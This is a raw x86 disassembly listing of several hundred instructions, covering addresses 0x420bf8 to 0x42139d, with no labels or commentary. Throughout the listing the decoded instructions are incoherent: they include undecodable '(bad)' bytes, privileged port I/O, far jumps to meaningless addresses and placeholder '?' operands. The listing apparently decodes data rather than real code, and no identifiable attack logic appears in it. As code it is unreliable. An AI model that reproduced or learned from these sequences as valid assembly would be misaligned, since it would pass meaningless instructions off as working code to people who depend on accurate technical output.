  420bf8:	lods   al,BYTE PTR ds:[esi]
  420bf9:	iret   
  420bfa:	mov    eax,0xe8615bfd
  420bff:	test   DWORD PTR [ebx+0x7cebc893],edi
  420c05:	push   cs
  420c06:	push   ds
  420c07:	cmp    bh,cl
  420c09:	sub    dh,dl
  420c0b:	(bad)  
  420c0c:	adc    eax,0x449a63b
  420c11:	out    dx,eax
  420c12:	test   DWORD PTR [ebp+0x748661e3],eax
  420c18:	mov    edi,0x4ef206d6
  420c1d:	inc    esp
  420c1e:	sub    BYTE PTR [edx],0xee
  420c21:	push   ecx
  420c22:	mov    ds:0x9edc3375,eax
  420c27:	cmp    bl,BYTE PTR [edx-0x49]
  420c2a:	dec    eax
  420c2b:	jnp    0x420bf5
  420c2d:	pop    eax
  420c2e:	sbb    eax,0xfaa3b015
  420c33:	pop    ebp
  420c34:	sahf   
  420c35:	in     al,0x39
  420c37:	mov    eax,ds:0xa8139cb6
  420c3c:	jbe    0x420bc4
  420c3e:	(bad)  
  420c3f:	push   esi
  420c40:	sbb    eax,0xd6bc5f5b
  420c45:	fs je  0x420c27
  420c48:	xchg   edi,eax
  420c49:	ss pop esi
  420c4b:	jbe    0x420c48
  420c4d:	mov    ebx,0xc5b2cc68
  420c52:	adc    BYTE PTR [edi-0x47],cl
  420c55:	mov    ds:0x3d2485d5,al
  420c5a:	test   al,0xa0
  420c5c:	call   0xcf24:0xa59d1469
  420c63:	mov    al,ds:0x1f206022
  420c68:	leave  
  420c69:	fstp   QWORD PTR [esi-0x3bd3e3e6]
  420c6f:	aaa    
  420c70:	mov    ds:0xea4e084,al
  420c75:	dec    esi
  420c76:	xor    DWORD PTR ds:0x7e6fbcbf,0xfffffffa
  420c7d:	js     0x420cc5
  420c7f:	pop    ecx
  420c80:	popf   
  420c81:	lods   al,BYTE PTR ds:[esi]
  420c82:	cld    
  420c83:	out    dx,eax
  420c84:	mov    eax,ds:0xa8e0b92f
  420c89:	xor    al,0x8a
  420c8b:	(bad)  
  420c8c:	mov    bh,0x51
  420c8e:	inc    edi
  420c8f:	mov    edi,0xef80bbcb
  420c94:	jmp    0xacba:0xf0c9ed0
  420c9b:	sbb    eax,DWORD PTR [esi+ebp*1]
  420c9e:	dec    esi
  420c9f:	fs lahf 
  420ca1:	sti    
  420ca2:	push   esi
  420ca3:	call   0xcf8729f5
  420ca8:	and    DWORD PTR [ebp+0x5434349a],eax
  420cae:	dec    eax
  420caf:	pusha  
  420cb0:	loopne 0x420c85
  420cb2:	aas    
  420cb3:	cmp    DWORD PTR [ebx-0x775d8f3c],esp
  420cb9:	retf   0x2767
  420cbc:	jne    0x420c4c
  420cbe:	and    BYTE PTR [edx+0x40],ch
  420cc1:	adc    BYTE PTR [esi-0x2b],cl
  420cc4:	adc    bl,BYTE PTR [edi]
  420cc6:	mov    ds:0xc4954f5d,eax
  420ccb:	jmp    0x4c63:0xd4a77174
  420cd2:	pushf  
  420cd3:	mov    cl,0xa5
  420cd5:	adc    edi,DWORD PTR [ebp+0x54e86ade]
  420cdb:	imul   esp,DWORD PTR [ebx+0x73ae7fde],0xffffffe3
  420ce2:	or     DWORD PTR [esi+ecx*4+0x4f],0x8
  420ce7:	jge    0x420d29
  420ce9:	pusha  
  420cea:	shl    ebp,cl
  420cec:	and    BYTE PTR [eax],ah
  420cee:	xor    BYTE PTR es:[ecx],0x76
  420cf2:	bound  edi,QWORD PTR [eax]
  420cf4:	cmp    al,0x3f
  420cf6:	ds daa 
  420cf8:	sub    al,0x2
  420cfa:	sar    BYTE PTR [esi],cl
  420cfc:	push   esi
  420cfd:	mov    eax,ds:0x1ac5a248
  420d02:	or     eax,0x15c11ece
  420d07:	mov    dh,0xa0
  420d09:	std    
  420d0a:	mov    bh,0xbb
  420d0c:	add    al,0xef
  420d0e:	(bad)  
  420d10:	stos   DWORD PTR es:[edi],eax
  420d11:	rsm    
  420d13:	jne    0x420d1b
  420d15:	call   0xd8382ee0
  420d1a:	cmp    BYTE PTR [ecx],dl
  420d1c:	mov    bl,BYTE PTR [ebx+0x25]
  420d1f:	fs xchg edi,eax
  420d21:	mov    dl,0xc8
  420d23:	and    eax,0x348e784b
  420d28:	into   
  420d29:	jl     0x420d81
  420d2b:	sub    eax,edi
  420d2d:	ror    BYTE PTR [esi],0x15
  420d30:	loope  0x420d0b
  420d32:	sahf   
  420d33:	test   eax,0x8e8dd15c
  420d38:	add    ah,bl
  420d3a:	ss pop ss
  420d3c:	jecxz  0x420d7d
  420d3e:	mov    dh,0xd6
  420d40:	das    
  420d41:	std    
  420d42:	aas    
  420d43:	stc    
  420d44:	fdiv   QWORD PTR [edi+0xb89aad1]
  420d4a:	sub    eax,0x88bd0276
  420d4f:	out    dx,al
  420d50:	cmp    eax,ebx
  420d52:	in     eax,dx
  420d53:	aam    0x1b
  420d55:	retf   0xfc7d
  420d58:	add    cl,bl
  420d5a:	ret    0x8950
  420d5d:	mov    eax,0x767263c6
  420d62:	dec    ebx
  420d63:	jno    0x420ce5
  420d65:	pop    ds
  420d66:	outs   dx,BYTE PTR ds:[esi]
  420d67:	imul   esp,DWORD PTR [edi-0x62a26b25],0xb7f19e04
  420d71:	sbb    al,0x6
  420d73:	outs   dx,BYTE PTR ds:[esi]
  420d74:	retf   0x46df
  420d77:	inc    ebx
  420d78:	aas    
  420d79:	cmp    DWORD PTR [ecx+0x3e21810f],ebp
  420d7f:	daa    
  420d80:	cmp    dl,BYTE PTR [edx-0x23]
  420d83:	js     0x420d4a
  420d85:	and    al,0x7f
  420d87:	retf   
  420d88:	xor    ecx,DWORD PTR [edi-0x524cf4c2]
  420d8e:	lods   eax,DWORD PTR ds:[esi]
  420d8f:	out    dx,eax
  420d90:	xor    al,0x2
  420d92:	ins    BYTE PTR es:[edi],dx
  420d93:	jle    0x420d9a
  420d95:	push   eax
  420d96:	pop    ecx
  420d97:	aam    0x1b
  420d99:	dec    esp
  420d9a:	enter  0xbb31,0xd6
  420d9e:	(bad)  
  420d9f:	loopne 0x420d28
  420da1:	jae    0x420d8d
  420da3:	mov    al,0xfa
  420da5:	fld    DWORD PTR [esi+0x64753e80]
  420dab:	add    bh,BYTE PTR [edi-0x7c]
  420dae:	scas   al,BYTE PTR es:[edi]
  420daf:	sbb    edi,DWORD PTR gs:[ebx-0x51]
  420db3:	ins    BYTE PTR es:[edi],dx
  420db4:	bound  esp,QWORD PTR [ecx]
  420db6:	sahf   
  420db7:	in     al,dx
  420db8:	dec    esi
  420db9:	stos   DWORD PTR es:[edi],eax
  420dba:	sub    DWORD PTR [ebx-0x5f],esi
  420dbd:	scas   eax,DWORD PTR es:[edi]
  420dbe:	test   eax,0x7bb1004b
  420dc3:	push   es
  420dc4:	mov    edi,0x4506a7a6
  420dc9:	cld    
  420dca:	xchg   edx,eax
  420dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dcc:	mov    ebx,0x2b6f334
  420dd1:	retf   0xf7c7
  420dd4:	pop    ds
  420dd5:	dec    edx
  420dd6:	push   ebx
  420dd7:	lock test BYTE PTR [ebx],0x53
  420ddb:	add    eax,0x1a106770
  420de0:	pusha  
  420de1:	lea    esi,[edx-0x56]
  420de4:	jo     0x420e0e
  420de6:	test   DWORD PTR [edi-0xb3e2b9e],0xaf8b31e5
  420df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420df1:	dec    ebx
  420df2:	into   
  420df3:	push   ebp
  420df4:	dec    ebx
  420df5:	push   eax
  420df6:	jg     0x420de5
  420df8:	aas    
  420df9:	inc    ebp
  420dfa:	je     0x420e04
  420dfc:	inc    ecx
  420dfd:	and    al,BYTE PTR [edi-0x6dc4b1ac]
  420e03:	dec    edi
  420e04:	mov    dh,0x5c
  420e06:	mov    WORD PTR [edi],gs
  420e08:	bound  edi,QWORD PTR [esi+eiz*4]
  420e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e0c:	js     0x420dd0
  420e0e:	lds    eax,FWORD PTR [edx+0x205f845f]
  420e14:	aad    0xd0
  420e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e17:	aas    
  420e18:	scas   al,BYTE PTR es:[edi]
  420e19:	aad    0xf4
  420e1b:	test   eax,0xcaec8711
  420e20:	lea    esp,ds:[edx+0x3a07cfd4]
  420e27:	add    al,0xad
  420e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e2a:	jp     0x420ddf
  420e2c:	push   edi
  420e2d:	push   eax
  420e2e:	jno    0x420e50
  420e30:	shl    bh,1
  420e32:	mov    ch,0xdf
  420e34:	push   ds
  420e35:	(bad)  
  420e37:	rol    ecx,1
  420e39:	and    edx,edi
  420e3b:	push   es
  420e3c:	xchg   edx,eax
  420e3d:	pop    ds
  420e3e:	loopne 0x420df8
  420e40:	push   0xffffffa8
  420e42:	cdq    
  420e43:	mov    eax,ds:0xba1b11af
  420e48:	jbe    0x420ebe
  420e4a:	pusha  
  420e4b:	outs   dx,BYTE PTR ds:[esi]
  420e4c:	test   eax,0x4b2963e1
  420e51:	repz jb 0x420e79
  420e54:	add    BYTE PTR [edi+0x22],al
  420e57:	(bad)  
  420e59:	cmp    cl,BYTE PTR [edi]
  420e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e5c:	dec    esi
  420e5d:	sbb    DWORD PTR [edx+ebx*1-0x54],ecx
  420e61:	mov    ah,0xdb
  420e63:	mov    bh,0xac
  420e65:	adc    al,0xcb
  420e67:	jns    0x420ee8
  420e69:	in     al,0x2f
  420e6b:	mov    edx,0xaedd8ff3
  420e70:	fld    DWORD PTR [edx-0x38cc1bca]
  420e76:	push   edx
  420e77:	fs ins BYTE PTR es:[edi],dx
  420e79:	cmp    DWORD PTR [edx],ecx
  420e7b:	jmp    0x8370:0x22834c01
  420e82:	ins    BYTE PTR es:[edi],dx
  420e83:	adc    DWORD PTR [ebp-0x53],ebp
  420e86:	pop    eax
  420e87:	jle    0x420ebf
  420e89:	fmul   DWORD PTR [esi-0x4b]
  420e8c:	sub    al,0x54
  420e8e:	and    al,0x63
  420e90:	scas   al,BYTE PTR es:[edi]
  420e91:	jg     0x420e1f
  420e93:	cmp    al,0x67
  420e95:	in     eax,0x23
  420e97:	add    ebp,DWORD PTR [edi+0x7b12b0eb]
  420e9d:	ret    0xdfd2
  420ea0:	push   edx
  420ea1:	lods   al,BYTE PTR ds:[esi]
  420ea2:	push   edi
  420ea3:	mov    gs,esi
  420ea5:	sbb    bl,BYTE PTR [eax+edi*2]
  420ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ea9:	cmc    
  420eaa:	pop    eax
  420eab:	sti    
  420eac:	ret    
  420ead:	loopne 0x420eef
  420eaf:	sbb    BYTE PTR [edi],dh
  420eb1:	lods   al,BYTE PTR ds:[esi]
  420eb2:	(bad)  
  420eb3:	call   0x2284:0xecce0ceb
  420eba:	mov    eax,ds:0x24193533
  420ebf:	repz or eax,DWORD PTR [eax+edx*1]
  420ec3:	cld    
  420ec4:	icebp  
  420ec5:	loopne 0x420e94
  420ec7:	lock pop ebx
  420ec9:	pop    edi
  420eca:	ffree  st(4)
  420ecc:	nop
  420ecd:	ins    BYTE PTR es:[edi],dx
  420ece:	sti    
  420ecf:	test   al,0xc8
  420ed1:	add    al,0x9d
  420ed3:	outs   dx,DWORD PTR ds:[esi]
  420ed4:	ja     0x420eea
  420ed6:	inc    eax
  420ed7:	xchg   esp,eax
  420ed8:	stc    
  420ed9:	ja     0x420f4a
  420edb:	loopne 0x420e9e
  420edd:	sbb    al,0x61
  420edf:	sar    BYTE PTR [esi],cl
  420ee1:	enter  0xc737,0x7b
  420ee5:	arpl   WORD PTR [eax*2-0x74ec2067],sp
  420eec:	lock imul ecx,DWORD PTR [ebx-0x1c8f998b],0xe920af53
  420ef7:	not    BYTE PTR [ebp-0x4e5cf398]
  420efd:	(bad)  
  420efe:	push   0x7a
  420f00:	cmp    BYTE PTR [edi],ch
  420f02:	je     0x420f82
  420f04:	mov    esp,0x607c23d9
  420f09:	inc    ebx
  420f0a:	add    BYTE PTR [ecx],cl
  420f0c:	sahf   
  420f0d:	cs push ebx
  420f0f:	or     DWORD PTR [ebp-0x35],esi
  420f12:	iret   
  420f13:	pop    ecx
  420f14:	inc    edi
  420f15:	mov    al,ds:0xc40d5a2
  420f1a:	mov    BYTE PTR [esi],dh
  420f1c:	adc    DWORD PTR [edi],ebp
  420f1e:	mov    ecx,0x7e9ca143
  420f23:	cmp    BYTE PTR ds:0x2b27c025,dl
  420f29:	fcompp 
  420f2b:	pusha  
  420f2c:	out    dx,eax
  420f2d:	mov    bl,0x40
  420f2f:	xor    cl,BYTE PTR [ecx+0x69]
  420f32:	add    DWORD PTR [ebp-0x2f],ebp
  420f35:	pop    ss
  420f36:	or     BYTE PTR [esi],ah
  420f38:	push   edi
  420f39:	scas   eax,DWORD PTR es:[edi]
  420f3a:	dec    esi
  420f3b:	inc    edi
  420f3c:	cmp    ch,BYTE PTR [esi]
  420f3e:	pop    eax
  420f3f:	cmp    BYTE PTR [esi],ah
  420f41:	jae    0x420f59
  420f43:	clc    
  420f44:	push   ebp
  420f45:	stos   DWORD PTR es:[edi],eax
  420f46:	mov    WORD PTR [edi+0x3b302364],ds
  420f4c:	ja     0x420f39
  420f4e:	adc    al,0xdc
  420f50:	ror    BYTE PTR [edx+0x2a11e216],1
  420f56:	and    al,0x3d
  420f58:	jg     0x420f8d
  420f5a:	cmp    DWORD PTR [ebx+0x760b13bc],edi
  420f60:	scas   eax,DWORD PTR es:[edi]
  420f61:	jns    0x420f97
  420f63:	outs   dx,DWORD PTR ds:[esi]
  420f64:	fcomp  DWORD PTR [esi+edi*4]
  420f67:	push   0x56
  420f69:	pop    ebp
  420f6a:	leave  
  420f6b:	inc    esi
  420f6c:	add    eax,0x1430ff88
  420f71:	aam    0xbc
  420f73:	clc    
  420f74:	fimul  DWORD PTR [edi]
  420f76:	mov    edi,0x38605132
  420f7b:	mov    bh,0xe6
  420f7d:	jmp    0xfacefc71
  420f82:	aam    0x14
  420f84:	adc    eax,0x26417d0c
  420f89:	mov    ebx,0xe7eb7f7a
  420f8e:	aaa    
  420f8f:	fadd   QWORD PTR [esi-0x76798ee0]
  420f95:	test   eax,0x9be477fd
  420f9a:	shr    DWORD PTR [ecx+edi*4],cl
  420f9d:	jmp    0x420f2e
  420f9f:	mov    esi,0x54d36303
  420fa4:	jg     0x420f3d
  420fa6:	scas   al,BYTE PTR es:[edi]
  420fa7:	sbb    eax,0x3e067ff5
  420fac:	push   ecx
  420fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fae:	in     al,0xe2
  420fb0:	fsubr  DWORD PTR cs:[ebp-0x38fecb73]
  420fb7:	out    dx,al
  420fb8:	das    
  420fb9:	ds pusha 
  420fbb:	xor    cl,BYTE PTR [esp+edi*8+0x7fe99bf1]
  420fc2:	jno    0x420fc6
  420fc4:	sbb    ah,BYTE PTR [ecx-0x11]
  420fc7:	pushf  
  420fc8:	lahf   
  420fc9:	inc    ebx
  420fca:	pop    es
  420fcb:	retf   0xb766
  420fce:	ficom  WORD PTR [eax]
  420fd0:	mov    bh,0x22
  420fd2:	outs   dx,DWORD PTR ds:[esi]
  420fd4:	xchg   esp,eax
  420fd5:	sub    eax,0x4ba7756d
  420fda:	mov    edx,0xc427e4f8
  420fdf:	inc    edi
  420fe0:	mov    ebp,0x8a7b4d6c
  420fe5:	dec    esp
  420fe6:	loop   0x420fb2
  420fe8:	xchg   ebp,eax
  420fe9:	xchg   DWORD PTR [edx-0x2e],eax
  420fec:	aas    
  420fed:	xlat   BYTE PTR ds:[ebx]
  420fee:	loope  0x420f97
  420ff0:	shl    DWORD PTR [edi+0x1b],1
  420ff3:	sub    DWORD PTR [ebx],edx
  420ff5:	push   DWORD PTR [edx]
  420ff7:	sub    eax,edi
  420ff9:	xchg   ecx,eax
  420ffa:	sbb    eax,0x6d69a5b7
  420fff:	std    
  421000:	push   edi
  421001:	out    0xc4,eax
  421003:	fs xchg esp,eax
  421005:	data16 mov cl,0x82
  421008:	daa    
  421009:	mov    ebp,0xf563896a
  42100e:	jne    0x421043
  421010:	mov    eax,0x72b4912f
  421015:	aad    0xb0
  421017:	cmp    dl,BYTE PTR [ebp+0x33b59194]
  42101d:	ins    BYTE PTR es:[edi],dx
  42101e:	sub    al,BYTE PTR [ebp+0x47]
  421021:	pop    esi
  421022:	mov    cl,0x48
  421024:	sar    DWORD PTR [edi],cl
  421026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421027:	dec    esi
  421028:	jmp    0x421094
  42102a:	(bad)  
  42102b:	clc    
  42102c:	mov    bl,0x33
  42102e:	push   ebp
  42102f:	bnd jae 0x420fce
  421032:	(bad)
  421035:	xchg   esp,eax
  421036:	out    dx,al
  421037:	pop    esp
  421038:	or     dl,BYTE PTR [edx]
  42103a:	nop
  42103b:	xchg   esi,eax
  42103c:	(bad)  
  42103d:	call   0xbcfc:0xfd4d94b8
  421044:	call   0x71bbac50
  421049:	adc    edi,DWORD PTR [ebx-0x53]
  42104c:	xrelease xchg BYTE PTR [ecx],bh
  42104f:	outs   dx,BYTE PTR ds:[esi]
  421050:	sub    BYTE PTR [ecx],cl
  421052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421053:	retf   0x2060
  421056:	sub    eax,0x930ab164
  42105b:	and    DWORD PTR [edi-0xe],edi
  42105e:	jmp    0xff115b83
  421063:	or     cl,dl
  421065:	gs ret 
  421067:	xchg   esi,edx
  421069:	fwait
  42106a:	aas    
  42106b:	and    BYTE PTR [ebp+0x5429b08f],ch
  421071:	mov    al,0xd2
  421073:	mov    BYTE PTR [eax],bh
  421075:	dec    ecx
  421076:	inc    ebx
  421077:	jno    0x4210d9
  421079:	lods   eax,DWORD PTR ds:[esi]
  42107a:	cmp    DWORD PTR [ecx-0x4b],ebx
  42107d:	xchg   ecx,eax
  42107e:	push   esi
  42107f:	cs icebp 
  421081:	sahf   
  421082:	ror    BYTE PTR [edx],0xf4
  421085:	sbb    al,BYTE PTR [ebx+0x2fc34469]
  42108b:	test   DWORD PTR [esi-0x5d3288e6],0x7cdccf30
  421095:	pop    es
  421096:	cli    
  421097:	mov    esp,0xbc82ed6
  42109c:	sar    ecx,cl
  42109e:	mov    esi,?
  4210a0:	les    ebx,FWORD PTR [ebx+0x12]
  4210a3:	mov    ds:0x786f9b54,al
  4210a8:	in     al,dx
  4210a9:	mov    cl,0x5e
  4210ab:	xor    DWORD PTR [ebp-0x55],edi
  4210ae:	jecxz  0x4210a1
  4210b0:	test   BYTE PTR [ecx-0x65],dl
  4210b3:	and    BYTE PTR [edx-0x6ee53d2d],dh
  4210b9:	adc    ch,BYTE PTR [ebx]
  4210bb:	sbb    eax,0x11c5410a
  4210c0:	imul   ecx,DWORD PTR [edx+ebx*1],0xffffffcf
  4210c4:	neg    ebp
  4210c6:	cli    
  4210c7:	add    DWORD PTR [edx+0x63e76282],ecx
  4210cd:	mov    al,0x7e
  4210cf:	jns    0x42113b
  4210d1:	test   esp,ebx
  4210d3:	push   ds
  4210d4:	pop    eax
  4210d5:	xlat   BYTE PTR ds:[ebx]
  4210d6:	and    dl,BYTE PTR ds:0xb7c2dcf8
  4210dc:	sbb    esp,DWORD PTR [ecx-0x1156edd0]
  4210e2:	xchg   esi,eax
  4210e3:	hlt    
  4210e4:	lods   eax,DWORD PTR ds:[esi]
  4210e5:	outs   dx,BYTE PTR ds:[esi]
  4210e6:	cmp    edx,ebp
  4210e8:	and    al,0xec
  4210ea:	nop    edi
  4210ed:	mov    BYTE PTR [edx+0x7142022a],cl
  4210f3:	jbe    0x4210ef
  4210f5:	cmp    al,BYTE PTR [ecx+edx*4-0x5874f208]
  4210fc:	xchg   ebp,eax
  4210fd:	mov    ah,bl
  4210ff:	sub    dh,ah
  421101:	pop    esp
  421102:	aas    
  421103:	sbb    edi,DWORD PTR [edx-0x40]
  421106:	inc    eax
  421107:	int    0x1d
  421109:	mov    eax,0x1889d7fd
  42110e:	jae    0x4210d9
  421110:	cmc    
  421111:	lods   eax,DWORD PTR ds:[esi]
  421112:	and    DWORD PTR ds:0x64623ae3,ebx
  421118:	out    dx,eax
  421119:	imul   edx,DWORD PTR [eax-0x80],0xffffffcd
  42111d:	jmp    DWORD PTR [esi-0x65]
  421120:	daa    
  421121:	xor    eax,0xd5437120
  421126:	sahf   
  421127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421128:	les    ebp,FWORD PTR [ecx]
  42112a:	lahf   
  42112b:	adc    edx,0x1b
  42112e:	push   edi
  42112f:	pop    edi
  421130:	dec    edx
  421131:	mov    al,ds:0x59a1978e
  421136:	dec    edx
  421137:	dec    ebp
  421138:	push   0xffffffb2
  42113a:	mov    dh,0xc6
  42113c:	and    eax,0x83a1e55
  421141:	ja     0x4210f5
  421143:	sahf   
  421144:	cs pop ebx
  421147:	or     eax,ebx
  421149:	push   cs
  42114a:	push   esp
  42114b:	jo     0x4211a4
  42114d:	test   BYTE PTR [eax+eax*8+0x56],bl
  421151:	scas   eax,DWORD PTR es:[edi]
  421152:	cmp    BYTE PTR [esi+ecx*8],cl
  421155:	enter  0xdcc6,0x27
  421159:	jp     0x421108
  42115b:	mov    ecx,0xa0556d17
  421160:	enter  0x50f0,0x91
  421164:	into   
  421165:	and    edx,ebx
  421167:	iret   
  421168:	arpl   WORD PTR [ebx],ax
  42116a:	loope  0x421146
  42116c:	mov    ch,0x37
  42116e:	or     DWORD PTR [edx-0x5d75978b],edx
  421174:	(bad)  
  421175:	retf   0x488
  421178:	ret    0x34b0
  42117b:	ror    DWORD PTR [ebx+0x31a08ba5],0x9
  421182:	(bad)  
  421183:	push   ds
  421184:	xchg   esp,eax
  421185:	jl     0x4211ad
  421187:	gs or  eax,0x4a682978
  42118d:	cmp    dh,BYTE PTR [edx+0xb]
  421190:	(bad)  
  421191:	cmp    bl,ah
  421193:	cmp    esi,ebx
  421195:	pop    ss
  421196:	dec    ebp
  421197:	dec    esp
  421198:	dec    eax
  421199:	add    ecx,DWORD PTR ds:0x74ef5f98
  42119f:	les    ebx,FWORD PTR [edi+0x43]
  4211a2:	and    bh,al
  4211a4:	add    DWORD PTR [ecx],ebp
  4211a6:	in     al,dx
  4211a7:	loopne 0x421209
  4211a9:	(bad)  
  4211aa:	push   ecx
  4211ab:	aam    0x1f
  4211ad:	leave  
  4211ae:	mov    ebx,0xc906b6fc
  4211b3:	jmp    0x63f50f4d
  4211b8:	mov    ch,0xa7
  4211ba:	gs aam 0x6
  4211bd:	pop    eax
  4211be:	jo     0x42123c
  4211c0:	fisubr WORD PTR [esi+ecx*2-0xd]
  4211c4:	outs   dx,DWORD PTR ds:[esi]
  4211c5:	lods   eax,DWORD PTR ds:[esi]
  4211c6:	js     0x42123d
  4211c8:	inc    esi
  4211c9:	cdq    
  4211ca:	xor    DWORD PTR [edi-0x7086c8d3],ecx
  4211d0:	mov    ecx,0xc51d95d4
  4211d5:	jg     0x4211d2
  4211d7:	mov    al,ds:0x642885d7
  4211dc:	inc    eax
  4211dd:	fwait
  4211de:	sub    eax,0x3c924dee
  4211e3:	push   ecx
  4211e4:	add    eax,0xb13b29b3
  4211e9:	dec    ebx
  4211ea:	int3   
  4211eb:	ins    BYTE PTR es:[edi],dx
  4211ec:	scas   al,BYTE PTR es:[edi]
  4211ed:	addr16 xor ch,dl
  4211f0:	xchg   esp,eax
  4211f1:	or     eax,0xb580f26e
  4211f6:	lea    esp,[ecx+0xf]
  4211f9:	pop    edi
  4211fa:	sub    esi,edi
  4211fc:	mov    DWORD PTR [ecx+0xb],edi
  4211ff:	hlt    
  421200:	test   BYTE PTR [eax+0x49510dfe],al
  421206:	fcmovne st,st(5)
  421208:	aas    
  421209:	sbb    eax,DWORD PTR [esi-0x4a7363c0]
  42120f:	test   al,0x34
  421211:	das    
  421212:	inc    ebp
  421213:	bound  ecx,QWORD PTR [ebp+eax*1-0x6fc22994]
  42121a:	sbb    DWORD PTR [ebx+0x43],ecx
  42121d:	cmp    edx,DWORD PTR [eax]
  42121f:	cmp    BYTE PTR [edx+esi*8],ah
  421222:	jne    0x421206
  421224:	xchg   edi,eax
  421225:	outs   dx,DWORD PTR ds:[esi]
  421226:	aaa    
  421227:	out    dx,al
  421228:	jecxz  0x421220
  42122a:	mov    es,WORD PTR [ebp-0x6303a4fa]
  421230:	mov    edx,0xd69f12d9
  421235:	adc    BYTE PTR [esi],ah
  421237:	outs   dx,DWORD PTR ds:[esi]
  421238:	sub    al,0xd9
  42123a:	cld    
  42123b:	inc    ecx
  42123c:	or     DWORD PTR [edi],ecx
  42123e:	jbe    0x4211c0
  421240:	std    
  421241:	dec    edx
  421242:	mov    ebp,0x14e889b1
  421247:	popf   
  421248:	call   0xb8208dc6
  42124d:	xchg   ebx,eax
  42124e:	push   esp
  42124f:	xor    BYTE PTR [edx-0x17],dh
  421252:	mov    esi,0x6e8a2427
  421257:	pop    ebp
  421258:	mov    al,0xce
  42125a:	add    cl,BYTE PTR [edx+esi*8+0x65442569]
  421261:	ds add al,0x5f
  421264:	and    dl,ch
  421266:	std    
  421267:	jmp    0xfc1efa91
  42126c:	or     ebx,DWORD PTR [esi-0x7f529b6c]
  421272:	inc    esp
  421273:	xchg   edi,eax
  421274:	icebp  
  421275:	mov    ebx,0xdf456ae0
  42127a:	out    dx,al
  42127b:	pop    ebp
  42127c:	mov    edx,0x7de79b86
  421281:	inc    edx
  421282:	sbb    BYTE PTR [ebx],ch
  421284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421285:	imul   esi,DWORD PTR [edi-0x44],0x6b6d622d
  42128c:	jno    0x4212af
  42128e:	mov    ds:0xc924ad86,al
  421293:	loope  0x4212d7
  421295:	in     eax,dx
  421296:	les    ebx,FWORD PTR [eax]
  421298:	out    dx,eax
  421299:	xchg   ecx,eax
  42129a:	add    al,0x40
  42129c:	ds (bad) 
  42129e:	jnp    0x421317
  4212a0:	gs adc al,bh
  4212a3:	cdq    
  4212a4:	in     al,0x6f
  4212a6:	inc    ebx
  4212a7:	or     esi,DWORD PTR [ebp+0x36]
  4212aa:	test   BYTE PTR [edx-0x7deef07f],dl
  4212b0:	or     ch,BYTE PTR [edi+0x48]
  4212b3:	pop    ss
  4212b4:	mov    esi,0x3343a904
  4212b9:	mov    ds:0xa9bd5fbd,eax
  4212be:	pop    ds
  4212bf:	pushf  
  4212c0:	scas   eax,DWORD PTR es:[edi]
  4212c1:	clc    
  4212c2:	jecxz  0x4212e7
  4212c4:	mov    cl,0xd0
  4212c6:	mov    DWORD PTR [edi+0x4d241893],edi
  4212cc:	xchg   ecx,eax
  4212cd:	sub    eax,0x6e1edd17
  4212d2:	rcl    BYTE PTR [esi+0x739ea037],0x38
  4212d9:	push   esp
  4212da:	mov    ecx,0xbf3ac353
  4212df:	sub    esp,DWORD PTR [ecx+0x5f]
  4212e2:	das    
  4212e3:	xlat   BYTE PTR ds:[ebx]
  4212e4:	push   ax
  4212e6:	jo     0x42132b
  4212e8:	sahf   
  4212e9:	xchg   edx,eax
  4212ea:	mov    ds:0x9d5b5b5e,al
  4212ef:	inc    eax
  4212f0:	aas    
  4212f1:	inc    eax
  4212f2:	and    eax,0x734db1c
  4212f7:	mov    ?,WORD PTR [ebx]
  4212f9:	js     0x42128d
  4212fb:	jmp    0x42130d
  4212fd:	daa    
  4212fe:	test   BYTE PTR [ebx*2+0x7c955073],cl
  421305:	push   0xe5923ae2
  42130a:	and    BYTE PTR [edi+0x3e9afa96],ah
  421310:	xor    ebp,DWORD PTR [ecx-0x6ea950af]
  421316:	pop    ebx
  421317:	dec    ebx
  421318:	lock (bad) 
  42131a:	cs out dx,al
  42131c:	push   esi
  42131d:	(bad)  
  42131e:	out    0xd3,eax
  421320:	or     ecx,DWORD PTR [edx-0x726d8944]
  421326:	ins    BYTE PTR es:[edi],dx
  421327:	in     eax,dx
  421328:	push   edi
  421329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42132a:	sbb    eax,0xe3beb6cb
  42132f:	ja     0x42132e
  421331:	push   eax
  421332:	adc    al,0x50
  421334:	xchg   edx,ebp
  421336:	sahf   
  421337:	test   eax,0x98c5cc76
  42133c:	jg     0x421320
  42133e:	dec    ebp
  42133f:	mov    ebx,0x2be0b4ec
  421344:	sahf   
  421345:	aad    0xdc
  421347:	ja     0x42139a
  421349:	push   ecx
  42134a:	cdq    
  42134b:	pusha  
  42134c:	push   edi
  42134d:	daa    
  42134e:	outs   dx,BYTE PTR ds:[esi]
  42134f:	out    dx,eax
  421350:	push   ebp
  421351:	test   eax,0x13065d1c
  421356:	sbb    al,0x90
  421358:	dec    ecx
  421359:	shr    DWORD PTR ds:0x269e7897,cl
  42135f:	leave  
  421360:	sub    DWORD PTR ds:0x33ba7287,esi
  421366:	adc    ebp,DWORD PTR [esi-0x5278087f]
  42136c:	xor    DWORD PTR ds:0x41971b4c,edx
  421372:	mov    dl,ch
  421374:	cld    
  421375:	arpl   cx,bp
  421377:	std    
  421378:	mov    dh,al
  42137a:	push   cs
  42137b:	sbb    eax,0x27eead24
  421380:	dec    ebx
  421381:	add    al,0x86
  421383:	loope  0x4213d6
  421385:	out    0x20,eax
  421387:	fsubr  DWORD PTR [ebx]
  421389:	adc    ebp,DWORD PTR [edi-0x54]
  42138c:	xchg   BYTE PTR [ecx-0x7f],bl
  42138f:	mov    ds:0x2398b3a,al
  421394:	dec    ebx
  421395:	cdq    
  421396:	aas    
  421397:	(bad)  
  421398:	(bad)  
  421399:	push   ss
  42139a:	fdiv   QWORD PTR [ecx+0x39]
  42139d:	push   edi
